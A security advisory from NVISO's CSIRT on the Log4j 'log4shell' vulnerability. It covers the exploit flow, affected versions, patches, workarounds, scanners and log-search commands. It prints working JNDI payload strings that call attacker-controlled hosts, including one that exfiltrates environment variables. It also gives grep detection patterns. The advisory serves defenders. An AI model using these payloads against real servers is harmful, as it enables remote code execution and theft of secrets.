## NVISO CSIRT ADVISORY
**Last update: 2021-12-29**


## SUMMARY
In this advisory we provide an overview of the recently discovered vulnerability in Apache log4j, CVE-2021-44228 and dubbed "log4shell", and how attackers can abuse it. Note that this advisory tackles the initial vulnerability, but the same guidance applies for consequent vulnerabilities. We are updating this advisory continuously as more information is released.

A high severity vulnerability in Apache log4j was disclosed publicly on 9 December 2021. This vulnerability was initially discovered by Chen Zhaojun of the Alibaba Cloud Security Team. Since the publication of this advisory, newer log4j versions have been published and consequently exploited. The latest release of log4j is 2.17.1.

Log4j is an open-source Java logging library that is widely used in many applications and is present as a dependency in many services. This includes enterprise applications and numerous cloud services. 
 
The original vulnerability allows for unauthenticated remote code execution using the following flow:
1.	Attacker sends data to the server (via any protocol). 
2.	The server (with log4j enabled) logs the data in the request, containing the malicious payload: `${jndi:ldap//attackerowneddomain.com/a}`
3.	The log4j vulnerability is triggered by this payload and the server makes a request to the attackerowneddomain.com via JNDI (Java Naming and Directory Interface). This also works using RMI (see link to SANS ISC post below)
5.	The server owned by the attacker responds to the request with a path to a remote (malicious) Java class file. This file is then injected in in the server process
6.	This malicious Java class file upon execution can trigger arbitrary code execution

## WHY THIS MATTERS
Given how widespread this library is used and how easy the exploit is, the impact of this vulnerability can be seen as very severe. 

On 10 December 2021 a PoC (Proof of Concept) was released for this vulnerability (https://github.com/tangxiaofeng7/apache-log4j-poc). Currently extensive scanning is being performed and a number of active exploitation attempts have been observed as well. In a first stage this vulnerability has been seen being used to deploy cryptocurrency mining software, this vulnerability will however be abused to gain an foothold in your network that can be used by a variety of attacks, now, or at a later stage (e.g. ransomware attacks, data theft, etc.). 

NCSC-NL has provided a list of vulnerable and non-vulnerable software to the log4j exploit, which can be found here: https://github.com/NCSC-NL/log4shell/tree/main/software

## RECOMMENDED ACTIONS
Critical risk vulnerabilities should be fully patched as soon as possible. 

Given the ease of exploitation it is strongly suggested to apply the patches for internet facing software immediately. Applying the patches to your internal software is recommended to be done at your earliest convenience.


## AFFECTED PRODUCTS
All Apache log4j versions from 2.0 up to and including 2.16.0 

All frameworks that use these versions (e.g. Apache Struts2, Apache Solr, Apache Druid, Apache Flink, etc.)

### Update on version 2.17.0 vulnerability CVE-2021-44832
Version 2.17.0 is vulnerable to a remote code execution if and only if the configuration file for Log4j is in a location or state that makes it editable by an attacker. Version 2.17.1 has been released to mitigate this completely but if you are already on 2.17.0 this is not a patch now situation. Patch when you can. Control access to the all configuration files using a least privledge model. 

## AVAILABLE WORKAROUNDS
- Scanners and mitigation tool (option Backup original file and remove JndiLookup.class from JAR recursively): 
   https://github.com/logpresso/CVE-2021-44228-Scanner or https://github.com/fullhunt/log4j-scan

- It is important to note that as part of the exploitation of this vulnerability, the vulnerable server must make an outbound request to the attacker owned server. Limiting outbound internet connectivity from web servers would prevent the full exploit chain. 

- Sanitize log data before processing into Log4j

#### Specific mitigations:
Mitigations have changed given latest guidence from The Apache Software Foundation.
https://logging.apache.org/log4j/2.x/security.html

TL;DR:
>
>Log4j 1.x mitigation: Not impacted by this vulnerability.
>
>Log4j 2.x mitigation: Implement one of the mitigation techniques below.
>* Upgrade to Log4j 2.3.2 (for Java 6), 2.12.4 (for Java 7), or 2.17.1 (for Java 8 and later).

### Scanner and mitigation tool (option Backup original file and remove JndiLookup.class from JAR recursively) 
https://github.com/logpresso/CVE-2021-44228-Scanner

log4j2-scan is a single binary command-line tool for CVE-2021-44228 vulnerability scanning and mitigation patch. It also supports nested JAR file scanning and patch. It also detects CVE-2021-45046 (log4j 2.15.0), CVE-2021-45105 (log4j 2.16.0), CVE-2021-4104 (log4j 1.x), and CVE-2021-42550 (logback 0.9-1.2.7) vulnerabilities.

## AVAILABLE PATCHES

On December 18, 2021, version 2.17.0 was released, addressing the latest vulnerabilities: https://logging.apache.org/log4j/2.x/changes-report.html#a2.17.0

On December 13, 2021, a new version (2.16.0) of log4j was released, disabling JNDI by default: https://logging.apache.org/log4j/2.x/changes-report.html#a2.16.0 

On December 10, 2021, version 2.15.0 RC2 was released. This patch was not complete. It was vulnerable to other attacks. See CVE-2021-45046.

## DETECTIONS

Search logs using following commands (the above mentioned Log4shell detector will give you a better view):

`sudo egrep -i -r '\$\{jndi:(ldap[s]?|rmi|dns):/[^\n]+' /var/log`

`sudo find /var/log -name \*.gz -print0 | xargs -0 zgrep -E -i '\$\{jndi:(ldap[s]?|rmi|dns):/[^\n]+'`

### Type of Observed Requests

- *Data Leakage*

    `${jndi:ldap://${env:JAVA_HOME}.<attackerdomain>}`
    
    Data is exfiltrated using Java environment variables. These variables can contain sensitive information such as API tokens or keys for online services.

- *Java Class reference*

    `${jndi:ldap://xxx.xxx.xxx.xxx:1389/Exploit}`
    
    A reference to a Java class file is defined in the LDAP settings which is loaded into the vulnerable application.

- *Base64 command*

    `${jndi:ldap://xxx.xxx.xxx.xxx:1389/Basic/Command/Base64/ZWNobyBoZWxsbyB3b3JsZA==}`
    
    One of the initial exploit kits https://github.com/feihong-cs/JNDIExploit/ (which has already been removed) contained a 'server' part which received the LDAP request and created a Java class file on the fly based on the encoded command.
